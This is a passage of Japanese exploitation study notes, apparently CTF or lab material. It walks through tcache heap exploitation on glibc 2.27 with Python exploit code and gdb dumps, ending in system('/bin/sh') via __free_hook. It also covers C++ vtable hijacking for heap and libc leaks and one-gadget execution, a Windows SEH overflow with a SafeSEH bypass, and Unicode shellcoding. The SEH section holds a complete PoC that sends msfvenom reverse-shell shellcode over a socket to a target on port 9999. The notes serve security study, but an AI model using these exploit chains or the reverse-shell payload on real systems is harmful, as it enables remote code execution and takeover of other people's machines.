0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a60:	0x4141414141414141	0x4141414141414141
0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えればfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959 <- mallocが返したアドレス。mallocしたことでtcache[0x20]が0x0000555555757ad0に！
0x555555757ac0:	0x0000000000000040	0x0000000000000101
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~ 
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021


----------------------------------------------------------------------------
前のチャンクはfreeせず、0x20sizeをmalloc後

tcachebins
0x20 [ -1]: 0x7ffff7dcfca0 (main_arena+96)
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000101
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- mallocが返したアドレス。show関数でリークできる！
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021
```
**0x100以上のmallocができない AND 複数のmallocのアドレスを保持できる AND free時にそのアドレスが消される AND libc2.27**   
```python
# 0x90のchunkを7個作成
for i in range(7):
    store(str(i),str(i)*(0x80) )
# 0x100のchunkを7個作成
# consolidateのfree時にtcacheを7つ埋めないと結合されずにtcacheに格納されてしまう
for i in range(7):
    store(str(7+i),str(i)*(0xf0) )

A="14"    # Aは0x90 (8個freeしてunsorted_binsにする用)
B="15"    # Bは0x20 (0x90のunsorted_binsの時にtopと結合されないため用)
C="0"     # Cは0x100 (free時にconsolidateする用)

store(A,"A"*0x80)
# このBは0x90の8個目のfree時にtopとの結合を防ぐため必ず直後にある必要がある！
store(B,"B"*0x10)          <- [1]

# 0x90を7個free
for i in range(7):
    delete(str(i))

store(C,"C"*0xf0)
# 0x100のfreeのconsolidate時にtopと結合されないように必ず直後にある必要がある！
store("1","1"*0x10)         <- [2]
# ここで8個目の0x90をfreeしてunsorted_binsに入れる。
# unsortedに入れた後にmallocすると、ここから切り出されてしまうためその前に必要なもの(Cや1)をmallocする！
delete(A)                   <- [3]

# 0x100を7つfreeしてtcacheを埋める。これでfree時にtcacheには入らずに結合(consolidate)される！
for i in range(7):
    delete(str(i+7))        <- [4]

# Cの0x101を0x100に書き換えて、PREV_SIZEを0x0にする
for i in range(8):
    delete(B)
    store(B,"b"*(0x18-i))
# CのPREV_SIZEに0xb0を書き込む
delete(B)
# Bのchunkはこれ以降freeしないのがポイント！このfdにmain_arenaが書き込まれるようにあれこれする！
store(B,"b"*0x10+"\xb0")    <- [5]

# A,B,Cが結合されて、0x1b0のchunkとなる
delete(C)                   <- [6]

# tcache[0x90]を使い切る
for i in range(7):
    store(str(i),"a"*0x80)
# 8個目の0x90のmallocは0x1b0から切り出される！
# この時返されるアドレスがBと同じで、Bはfreeされていないので2回freeできる！(同じアドレスを二つの変数で持っている)
store(A,"a"*0x80)           <- [7]
```
```txt
--------------------------------------------------------------------------------------
[1]

|   heap    heap |
|                |
|           0x91 |
|                | 
|           0x91 |
|                |
|    ~        ~  |
|                |
|           0x91 | <- 7個目 
|                | 
|           0x101| 
|                | 
|           0x101| 
|                | 
|             ~  | 
|                | 
|           0x101| <- 7個目 
|                |
|           0x91 | <- A
|                |
|           0x21 | <- B
|                |

--------------------------------------------------------------------------------------
[2]

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0

|                | 
|           0x101| <- 7個目 
|                |
|           0x91 | <- A
|                |
|           0x21 | <- B
|                |
|           0x101| <- C 
|                |
|           0x21 | <- 1
|                |
--------------------------------------------------------------------------------------
[3]

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757d40 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757d40 /* '@}uUUU' */

0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x0000000000000091
0x555555757d50:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- 0x90のunsortedを作成！
0x555555757d60:	0x4141414141414141	0x4141414141414141
0x555555757d70:	0x4141414141414141	0x4141414141414141
0x555555757d80:	0x4141414141414141	0x4141414141414141
0x555555757d90:	0x4141414141414141	0x4141414141414141
0x555555757da0:	0x4141414141414141	0x4141414141414141
0x555555757db0:	0x4141414141414141	0x4141414141414141
0x555555757dc0:	0x4141414141414141	0x4141414141414141
0x555555757dd0:	0x0000000000000090	0x0000000000000020 <- unsortedしたので0x21から0x20に上書き
0x555555757de0:	0x4242424242424242	0x4242424242424242
0x555555757df0:	0x0000000000000000	0x0000000000000101
0x555555757e00:	0x4343434343434343	0x4343434343434343
--------------------------------------------------------------------------------------
[4]
tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
0x100 [  7]: 0x555555757c50 —▸ 0x555555757b50 —▸ 0x555555757a50 —▸ 0x555555757950 —▸ 0x555555757850 —▸ 0x555555757750 —▸ 0x555555757650 ◂— 0x0
unsortedbin
all: 0x555555757d40 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757d40 /* '@}uUUU' */

0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x0000000000000091
0x555555757d50:	0x00007ffff7dcfca0	0x00007ffff7dcfca0  特になにも変化なし。0x100を7つtcacheに入れただけ
0x555555757d60:	0x4141414141414141	0x4141414141414141
0x555555757d70:	0x4141414141414141	0x4141414141414141
0x555555757d80:	0x4141414141414141	0x4141414141414141
0x555555757d90:	0x4141414141414141	0x4141414141414141
0x555555757da0:	0x4141414141414141	0x4141414141414141
0x555555757db0:	0x4141414141414141	0x4141414141414141
0x555555757dc0:	0x4141414141414141	0x4141414141414141
0x555555757dd0:	0x0000000000000090	0x0000000000000020
0x555555757de0:	0x4242424242424242	0x4242424242424242
0x555555757df0:	0x0000000000000000	0x0000000000000101
0x555555757e00:	0x4343434343434343	0x4343434343434343

--------------------------------------------------------------------------------------
[5]

0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
0x100 [  7]: 0x555555757c50 —▸ 0x555555757b50 —▸ 0x555555757a50 —▸ 0x555555757950 —▸ 0x555555757850 —▸ 0x555555757750 —▸ 0x555555757650 ◂— 0x0
unsortedbin
all: 0x555555757d40 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757d40 /* '@}uUUU' */

0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x0000000000000091
0x555555757d50:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757d60:	0x4141414141414141	0x4141414141414141
0x555555757d70:	0x4141414141414141	0x4141414141414141
0x555555757d80:	0x4141414141414141	0x4141414141414141
0x555555757d90:	0x4141414141414141	0x4141414141414141
0x555555757da0:	0x4141414141414141	0x4141414141414141
0x555555757db0:	0x4141414141414141	0x4141414141414141
0x555555757dc0:	0x4141414141414141	0x4141414141414141
0x555555757dd0:	0x0000000000000090	0x0000000000000020
0x555555757de0:	0x6262626262626262	0x6262626262626262
0x555555757df0:	0x00000000000000b0	0x0000000000000100 <- 0xb0,0x100が上書きされた！
0x555555757e00:	0x4343434343434343	0x4343434343434343    これでconsolidateする準備OK


--------------------------------------------------------------------------------------
[6]

tcachebins
0x90 [  7]: 0x5555557575c0 —▸ 0x555555757530 —▸ 0x5555557574a0 —▸ 0x555555757410 —▸ 0x555555757380 —▸ 0x5555557572f0 —▸ 0x555555757260 ◂— 0x0
0x100 [  7]: 0x555555757c50 —▸ 0x555555757b50 —▸ 0x555555757a50 —▸ 0x555555757950 —▸ 0x555555757850 —▸ 0x555555757750 —▸ 0x555555757650 ◂— 0x0
unsortedbin
all: 0x555555757d40 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757d40 /* '@}uUUU' */


0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x00000000000001b1 <- 0x1b1の結合されたchunkに！
0x555555757d50:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757d60:	0x4141414141414141	0x4141414141414141
0x555555757d70:	0x4141414141414141	0x4141414141414141
0x555555757d80:	0x4141414141414141	0x4141414141414141
0x555555757d90:	0x4141414141414141	0x4141414141414141
0x555555757da0:	0x4141414141414141	0x4141414141414141
0x555555757db0:	0x4141414141414141	0x4141414141414141
0x555555757dc0:	0x4141414141414141	0x4141414141414141
0x555555757dd0:	0x0000000000000090	0x0000000000000020
0x555555757de0:	0x6262626262626262	0x6262626262626262
0x555555757df0:	0x00000000000000b0	0x0000000000000100
0x555555757e00:	0x4343434343434343	0x4343434343434343

------------------------------------------------------------------------------------
[7]

tcachebins
0x100 [  7]: 0x555555757c50 —▸ 0x555555757b50 —▸ 0x555555757a50 —▸ 0x555555757950 —▸ 0x555555757850 —▸ 0x555555757750 —▸ 0x555555757650 ◂— 0x0
unsortedbin
all: 0x555555757dd0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757dd0

0x555555757d30:	0x3636363636363636	0x3636363636363636
0x555555757d40:	0x0000000000000000	0x0000000000000091 <- 0x1b0から0x90に(0x90を切り出した)
0x555555757d50:	0x6161616161616161	0x6161616161616161
0x555555757d60:	0x6161616161616161	0x6161616161616161
0x555555757d70:	0x6161616161616161	0x6161616161616161
0x555555757d80:	0x6161616161616161	0x6161616161616161
0x555555757d90:	0x6161616161616161	0x6161616161616161
0x555555757da0:	0x6161616161616161	0x6161616161616161
0x555555757db0:	0x6161616161616161	0x6161616161616161
0x555555757dc0:	0x6161616161616161	0x6161616161616161
0x555555757dd0:	0x0000000000000000	0x0000000000000121 <- unsortedの切り出された残りはここ！
0x555555757de0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- このアドレスが返された！
0x555555757df0:	0x00000000000000b0	0x0000000000000100    showでlibcleakもできるし、double freeもできる！
0x555555757e00:	0x4343434343434343	0x4343434343434343

```
#### Heapでの system("/bin/sh")実行の流れ

```txt
------------------------------------------------------------------------------------
0x40サイズのmallocによって、偽のチャンクの0x555555757a90が返り、tcache[0x100]のnextに_free_hookアドレスを書き込んでfree後

(0x20)   tcache_entry[0](255): 0x7ffff7dcfca0 --> 0x555555757c30
(0x40)   tcache_entry[2](1): 0x555555757ab0
(0x100)   tcache_entry[14](7): 0x555555757ad0 (overlap chunk with 0x555555757aa0(freed) )
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041 <- この偽のチャンクを使って_free_hookアドレスを書き込み、tcache[0x100]にoverlapさせる
0x555555757ab0: 0x0000000000000000      0x555555757010
0x555555757ac0: 0x5a5a5a5a5a5a5a5a      0x0000000000000101 <- freeすることでこの偽の0x100chunkに対応するtcache[0x100]に0x555555757ad0を代入(overlapする)
0x555555757ad0: 0x00007ffff7dd18e8      0x00007ffff7dcfc00 <- _free_hookを上書きした
0x555555757ae0: 0x3737373737373737      0x3737373737373737


    ch.alloc(0xf8, '0') [1]
    ch.wipe()

    ch.alloc(0xf8, p64(addr_libc_system)) [2]
    ch.wipe()

    ch.alloc(0x38, '/bin/sh') [3]
    ch.delete(False) [4]
    
[1] 次に0x100サイズmallocすれば、0x555555757ad0がmallocによって返り、nextの0x00007ffff7dd18e8がtcache[0x100]に入る

[2] そのあと、freeせずにまた0x100サイズmallocすれば、0x00007ffff7dd18eがmallocによって返り、_free_hookアドレスにp64(addr_libc_system)を書き込める！
    これで、次にfreeするとsystem関数が実行される！
    
[3] そのあと、freeせずに適当なサイズ(0x40とか)mallocし、"/bin/sh"をmallocが返したアドレスに書き込む

[4] この後にfreeすれば、system("/bin/sh")が実行される！
    free関数はfree(content)となっており、contentはmallocが返したアドレスを指している
    このとき、content(というアドレス)には"/bin/sh"という文字列が入っている
    なので、free(content)はsystem(content)と同じであり、content="/bin/sh"なのでsystem("/bin/sh")が実行される！

```

#### C++のvtableの書き換え
子クラスのメンバ関数を親クラスのポインタ経由で呼び出したとき、親クラスのメンバ関数ではなく子クラスのメンバ関数が呼びだされる。   
C++では`virtual`で装飾されているメンバ関数がこの動作をし、**vtable**(仮想関数テーブル)で実現される。   
```C++
// Birdクラス
struct Bird {
    string name() {return typeid(*this).name();};
    virtual void sing() = 0;     // sing()を仮想関数として宣言
    virtual ~Bird() = default;   // 子クラスで再定義できる
};

// Parrotクラスは publicで Birdクラスを継承
class Parrot: public Bird {
    string memory;
public:
    Parrot () {            // コンストラクタ(初期化) 
        cout<<"Input: ";
        cin>>memory.data();   // この部分にHeap overflowの脆弱性 cin>>memory; とするべき
                              // _M_local_bufの0x10サイズ以上を書き込むことで次のstringの_M_pを上書きできる
    }
    void sing() override {cout<<memory.c_str()<<endl;} // overrideで親クラスのsing()を再定義
};

Bird *cage[4];  // 親クラスBirdのポインタ

// 子クラスParrotのオブジェクトを親クラスBirdのポインタ経由で生成
// newの内部でmallocが実行され、Heapのアドレスがcage[0]に代入される
void malloc() {
    cage[0] = new Parrot();  // 子クラスParrotのオブジェクトを生成
}

// 親クラスBirdのポインタcage経由で子クラスParrotのメンバ関数sing()を呼び出す
void show() {
    cage[0]->sing();       // 子クラスParrotのsing()が呼びだされる
}
```
親クラスBirdのポインタcage経由で子クラスParrotのメンバ関数sing()を呼び出す際の動作   
```txt

 Birdクラス(親)のポインタ*cage
0x605380 |                      |
0x605388 |  Parrot_object_addr  | <- [1] Birdクラスのポインタcage[0] (0x001010)
0x605390 |                      |

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | <- Birdクラスのポインタcage
0x001010 | Parrot_vtable+0x10   | <- [2] Parrotのvtableへのアドレス (0x604d10) new Parrot()がこのアドレスを返す
0x001018 |　      _M_p          | <- 文字列のポインタ (0x001028)
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- 文字列のサイズは0x10 cin>>memory.data()はここに書き込まれる
0x001030 |       ......         | <- prev_sizeは使用済み
0x001038 |     chunk size       | 
0x001040 |     vtable+0x10      |
0x001048 |　      _M_p          | <- 文字列のポインタ (0x001028)
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |

 Parrotのvtable
0x604d00 |         0x0          | <- 多重継承に使う情報
0x604d08 |     typeinfo_addr    | 
0x604d10 |  Parrot.sing()_addr  | <- [3] Parrotクラスの仮想メンバ関数のアドレス
```
**Heap leak**   
```txt
_M_p(文字列のポインタ)を書き換えて、既知の任意のアドレスの値を読みだす！
Heapをleakするには、mallocが返すアドレスがある変数のアドレスの値をleakする！
2つ分のchunkをmallocしておいて、一つ目をfreeして、Heap overflowで2つ目の_M_pを書き換える

 Birdクラス(親)のポインタ*cage
0x605380 |                      |
0x605388 |  Parrot_object_addr  | <- Heapのアドレスが書き込まれている！ (0x001010)
0x605390 |                      |

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | 
0x001010 | Parrot_vtable+0x10   | 
0x001018 |　      _M_p          | 
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- "A"*8
0x001030 |       ......         | <- "A"*8
0x001038 |     chunk size       | <- p64(0x31) chunk sizeの0x31を書き換えないように
0x001040 |     vtable+0x10      | <- p64(0x604d10) 書き換えないように
0x001048 |　      _M_p          | <- p64(0x605388) cage変数のアドレス
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |

```
**libc leak**
```txt
Heap leakとほぼ同じ
libcをleakするには、すでに呼びだされた関数(libc_start_mainなど)のGOTにあるlibcのアドレスをleakする！

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | 
0x001010 | Parrot_vtable+0x10   | 
0x001018 |　      _M_p          | 
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- "A"*8
0x001030 |       ......         | <- "A"*8
0x001038 |     chunk size       | <- p64(0x31) chunk sizeの0x31を書き換えないように
0x001040 |     vtable+0x10      | <- p64(0x604d10) 書き換えないように
0x001048 |　      _M_p          | <- p64(0x604fe8) libc_start_mainのGOT_addr 
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |
```
**one-gadget-rce**
```txt
Heap leak, libc leakが前提条件
Heapのvtableの場所に書かれている関数が実行されるので、Heapにone-gaget-rceのアドレスを書き込んでそのアドレスにvtableの場所を書き換える

 Parrotクラス(子)のobject [Heap]
0x001000 |     prev_size        |
0x001008 |     chunk size       | 
0x001010 | Parrot_vtable+0x10   | 
0x001018 |　      _M_p          | 
0x001020 |   _M_string_length   |
0x001028 |     _M_local_buf     | <- "A"*8
0x001030 |       ......         | <- "A"*8
0x001038 |     chunk size       | <- p64(0x31) chunk sizeの0x31を書き換えないように
0x001040 |     vtable+0x10      | <- p64(0x001048) このアドレスにはメンバ関数のアドレスが書かれていた
0x001048 |　      _M_p          | <- p64(0x7fffffff12345678) 偽のvtable(一個上)がここを指している
0x001050 |   _M_string_length   |
0x001058 |    _M_local_buf      |

```
### SEH overflow
Windowsの例外処理の際に実行されるハンドラーのアドレスはスタック上に格納されるため、そこをうまい感じに書き換えてやると任意のアドレスにjmpされられる(EIPを制御できる)   
**SEHレコード**   
```txt
typedef struct _EXCEPTION_REGISTRATION_RECORD  <- SEHレコード(スタック上に存在)
{
 struct _EXCEPTION_REGISTRATION_RECORD *_next;   <- 次のSEHレコードのnextのアドレス
 PEXCEPTION_ROUTINE _handler;                    <- 例外処理のハンドラー(例外発生時に実行される)
} EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;

   スタック       アドレス
|             | (0x000)
|    next_1   | (0x004) <- [0x18] next_2を指している
|  handler_1  | (0x008) <- [handler_1の処理のアドレス]
|             | (0x00c)
|             | (0x0010)
|             | (0x0014)
|    next_2   | (0x0018)
|  handler_2  | (0x001c)

```
**例外ハンドラの引数**    
```txt
EXCEPTION_DISPOSITION __cdecl _except_handler (    <- handlerが呼びだされる際の引数を定義
 _In_ struct _EXCEPTION_RECORD *_ExceptionRecord,
 _In_ void * _EstablisherFrame,                    <- SEHレコードのnextのアドレスを二つ目(esp+8)に持つ
 _Inout_ struct _CONTEXT *_ContextRecord,
 _Inout_ void * _DispatcherContext
);
```
#### Payload実行までの流れ
(esp+8)にSEHレコードのnextのアドレスが存在するため、pop,pop,retを実行することで、
このSEHレコードのnextのアドレスをEIPに代入できる！！   
```txt
-------------------------------------------------------------------
call handler_1(EIPにhandler_1のアドレスを代入)直前

例外が発生したのをキャッチしてhandler_1が実行される直前の時、
handler_1関数を実行するために必要な引数がスタック上に用意された状態になる。

   スタック       アドレス
|             | (0x000)
|   E_Record  | (0x004) <- esp  
|   E_Frame   | (0x008) <- esp+4  SEHレコードのアドレス"0x104"が書き込まれている
|   C_Record  | (0x00c)
|   D_Context | (0x010)
       ~           ~
|             | (0x100)
|    next_1   | (0x104) <- "AAAA"をbofで上書き
|  handler_1  | (0x108) <- pop,pop,retのアドレスで上書き
|             | (0x10c)    ほんとはここにjmp eaxみたいにしたいけど、
|             | (0x0110)   レジスタはすべて悪用防止のため0初期化されてしまう。
|             | (0x0114)   だからpop,pop,retとかいう面倒なやり方をするしかない
|    next_2   | (0x0118)
|  handler_2  | (0x011c)
-------------------------------------------------------------------
call handler_1(EIPにhandler_1のアドレスを代入)直後
pop,pop,ret直前

EIP = pop,pop,retのアドレス

スタック       アドレス
|   ret_addr  | (0x000) <- esp handler_1のret_addrがcall時にpushされたのでespがずれた！
|   E_Record  | (0x004) <- esp+4
|   E_Frame   | (0x008) <- esp+8 (esp+4からesp+8に変わった！)
|   C_Record  | (0x00c)
|   D_Context | (0x010)
       ~           ~
|             | (0x100)
|    next_1   | (0x104) <- "AAAA"をbofで上書き
|  handler_1  | (0x108) <- pop,pop,retのアドレスで上書き
|             | (0x10c)
|             | (0x0110)
|             | (0x0114)
|    next_2   | (0x0118)
|  handler_2  | (0x011c)

-------------------------------------------------------------------
ret直前　(pop,pop後)

スタック       アドレス
|   ret_addr  | (0x000) 
|   E_Record  | (0x004) 
|   E_Frame   | (0x008) <- esp  SEHレコードのアドレス"0x104"が書き込まれている
|   C_Record  | (0x00c) <- esp+4
|   D_Context | (0x010)
       ~           ~
|             | (0x100)
|    next_1   | (0x104) 
|  handler_1  | (0x108) 
|             | (0x10c)
|             | (0x0110)
|             | (0x0114)
|    next_2   | (0x0118)
|  handler_2  | (0x011c)
-------------------------------------------------------------------
ret直後　

ret命令で、その時にESPが指している値をEIPに代入
EIP = 0x104

スタック       アドレス
|   ret_addr  | (0x000) 
|   E_Record  | (0x004) 
|   E_Frame   | (0x008)        SEHレコードのアドレス"0x104"がEIPに代入された！
|   C_Record  | (0x00c) <- esp
|   D_Context | (0x010) <- esp+4
       ~           ~
|             | (0x100)
|    next_1   | (0x104) <- EIP "AAAA"が書き込まれているので、次は命令"0x41414141"を実行しようとする！
|  handler_1  | (0x108) <- pop,pop,retのアドレスで上書きされている
|             | (0x10c)
|             | (0x0110)
|             | (0x0114)
|    next_2   | (0x0118)
|  handler_2  | (0x011c)

"0x108"にはアドレスが書き込まれており、命令ではないためここに処理が進むとエラーとなってしまう！
この"0x41414141"を"jmp $+8"とかで"0x10c"に向けて、そこに"jmp $-0x300"命令を書いておけば、サイズの大きいスタック領域をEIPが指すようになる！
そこにペイロードをセットしておけば、ペイロードを実行できる！
```
#### SafeSEH
例外ハンドラのアドレスを事前に保存している例外ハンドラテーブルを用意し、例外ハンドラが呼びだされる際にそのテーブルにあるアドレスかどうかを確認することで、例外ハンドラのアドレスの上書きを検知する。   
```txt
まず、呼び出されたハンドラのアドレスがどの実行可能イメージのアドレスなのかを確認する

if (その実行可能イメージが例外ハンドラテーブルを持っている):
   if (呼び出されたハンドラのアドレスが例外ハンドラテーブルに存在する):
      実行
   else (例外ハンドラテーブルに存在しない):
      上書きを検知！実行しない
else (実行可能イメージがテーブルを持っていない):
   実行

したがって、SafeSEHが無効(SafeSETオプションなしでコンパイルされた)のイメージ(.exeや.dll)のアドレスで上書きした場合はSafeSEHで実行を阻止できない！
つまり、
    SafeSEH無効のイメージからpop,pop,retのアドレスをhandlerに上書きすればよい！
    
```
#### PoC
```python
import sys
import socket
host = "192.168.56.6"
port = 9999

badheader = "GMON /"
baddata = b"\x90" * 2773
#start payload
baddata += "\x90"*16
# sudo msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=192.168.56.5 -b "\x00\x0a\x0d" -f py --var-name baddata
baddata += b"\xd9\xc1\xd9\x74\x24\xf4\xbe\xcf\x6f\x35\xbb\x58"
baddata += b"\x31\xc9\xb1\x52\x31\x70\x17\x03\x70\x17\x83\x0f"
baddata += b"\x6b\xd7\x4e\x73\x9c\x95\xb1\x8b\x5d\xfa\x38\x6e"
baddata += b"\x6c\x3a\x5e\xfb\xdf\x8a\x14\xa9\xd3\x61\x78\x59"
baddata += b"\x67\x07\x55\x6e\xc0\xa2\x83\x41\xd1\x9f\xf0\xc0"
baddata += b"\x51\xe2\x24\x22\x6b\x2d\x39\x23\xac\x50\xb0\x71"
baddata += b"\x65\x1e\x67\x65\x02\x6a\xb4\x0e\x58\x7a\xbc\xf3"
baddata += b"\x29\x7d\xed\xa2\x22\x24\x2d\x45\xe6\x5c\x64\x5d"
baddata += b"\xeb\x59\x3e\xd6\xdf\x16\xc1\x3e\x2e\xd6\x6e\x7f"
baddata += b"\x9e\x25\x6e\xb8\x19\xd6\x05\xb0\x59\x6b\x1e\x07"
baddata += b"\x23\xb7\xab\x93\x83\x3c\x0b\x7f\x35\x90\xca\xf4"
baddata += b"\x39\x5d\x98\x52\x5e\x60\x4d\xe9\x5a\xe9\x70\x3d"
baddata += b"\xeb\xa9\x56\x99\xb7\x6a\xf6\xb8\x1d\xdc\x07\xda"
baddata += b"\xfd\x81\xad\x91\x10\xd5\xdf\xf8\x7c\x1a\xd2\x02"
baddata += b"\x7d\x34\x65\x71\x4f\x9b\xdd\x1d\xe3\x54\xf8\xda"
baddata += b"\x04\x4f\xbc\x74\xfb\x70\xbd\x5d\x38\x24\xed\xf5"
baddata += b"\xe9\x45\x66\x05\x15\x90\x29\x55\xb9\x4b\x8a\x05"
baddata += b"\x79\x3c\x62\x4f\x76\x63\x92\x70\x5c\x0c\x39\x8b"
baddata += b"\x37\xf3\x16\xab\xc2\x9b\x64\xcb\xdd\x07\xe0\x2d"
baddata += b"\xb7\xa7\xa4\xe6\x20\x51\xed\x7c\xd0\x9e\x3b\xf9"
baddata += b"\xd2\x15\xc8\xfe\x9d\xdd\xa5\xec\x4a\x2e\xf0\x4e"
baddata += b"\xdc\x31\x2e\xe6\x82\xa0\xb5\xf6\xcd\xd8\x61\xa1"
baddata += b"\x9a\x2f\x78\x27\x37\x09\xd2\x55\xca\xcf\x1d\xdd"
baddata += b"\x11\x2c\xa3\xdc\xd4\x08\x87\xce\x20\x90\x83\xba"
baddata += b"\xfc\xc7\x5d\x14\xbb\xb1\x2f\xce\x15\x6d\xe6\x86"
baddata += b"\xe0\x5d\x39\xd0\xec\x8b\xcf\x3c\x5c\x62\x96\x43"
baddata += b"\x51\xe2\x1e\x3c\x8f\x92\xe1\x97\x0b\xa2\xab\xb5"
baddata += b"\x3a\x2b\x72\x2c\x7f\x36\x85\x9b\xbc\x4f\x06\x29"
baddata += b"\x3d\xb4\x16\x58\x38\xf0\x90\xb1\x30\x69\x75\xb5"
baddata += b"\xe7\x8a\x5c"

baddata += "\x90"*(3518 - len(baddata))

baddata += "\xeb\x0f\x90\x90" # jmp $+0x11
baddata += "\xb4\x10\x50\x62" # SafeSEH無効のモジュールのpop,pop,retのアドレス
baddata += "\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1\xe8\xf2\xff\xff\xff" # 大きい領域にjmp $-758する
baddata += "D"*(4000-len(baddata))

print("Sending payload....")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((host,port))
s.send(badheader + baddata)
s.close()
```
### Unicode shellcoding
入力された文字列がUnicode形式でメモリに保存される場合、`0x4141`が`0x00410041`となるため通常時のようにはいかない。   
`0x00~0x7f`までは`0x41->0x0041`と変換されるが、それ以上は必ずしも0x00が付くだけとは限らない！   
`0x81->0xac20`とか。とくに`0x80~0x9f`あたりがヤバそう。詳しくは以下を参照   
https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf   
#### pop,pop,retの検索
SEHを使用したExploitの場合、`0x0045000e`みたいな感じのアドレス形式の`pop,pop,ret`を探す必要がある。   
`!mona seh -m AIMP2.dll -cp unicode`   
なお、NSEHに書き込める4バイト(0x00410041とか)で、JMPできない場合は、SEHのアドレスが命令と解釈されて実行されるが、それがいい感じにNOP(と同等の命令)になればよい。   
```txt
|              | (0x100)
| next_1 (NSEH)| (0x104) <- "0x00650042"で上書き (入力は"\x42\x65"とする) <- pop,pop,ret後ここに帰ってきて実行しようとする
|handler_1(SEH)| (0x108) <- pop,pop,retのアドレス(0x0045000e)で上書き (入力は"\x0e\x45"とする)
|              | (0x10c)

右下のスタック図
+100| 00 00 00 00 | .... 
+104| 00 65 00 42 | B.e. <- ここに帰ってくるので、ここから命令と解釈して実行する
+108| 00 45 00 0e | ?.E.
+10c| 00 00 00 00 | ....

左上のCPU命令図 (pop,pop,ret直後)
42       | INC EDX                    <- これらはすべて正しい命令と解釈され、実質的にNOPと同じ動作をする(無意味な命令)
